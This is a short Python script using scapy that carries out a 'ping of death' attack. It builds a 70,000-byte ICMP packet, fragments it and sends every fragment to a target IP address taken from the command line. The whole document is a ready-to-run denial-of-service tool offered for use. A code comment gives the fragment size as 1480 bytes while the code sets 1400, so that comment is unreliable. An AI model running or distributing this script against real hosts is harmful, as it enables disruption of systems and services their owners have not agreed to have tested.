import sys
from scapy.all import *

def start_ping_of_dead_attack(targetIP):
  print("\n--- START PING OF DEATH ATTACK ---")
  big_packet = IP(dst=targetIP)/ICMP()/("X"*70000) # create a large packet
  frags = fragment(big_packet, fragsize = 1400) # fragment the packet into 1480-byte chunks
  print(f"Total number of fragments: {len(frags)}")
  for f in frags:
    send(f)
  print("--- COMPLETED ---\n")
if __name__ == '__main__':
    argv_len = len(sys.argv)
    if  argv_len < 2:
        print("Invalid input arguments")
        print("python ping_of_death.py <targetIP>")
    else:
        targetIP = sys.argv[1]
        start_ping_of_dead_attack(targetIP)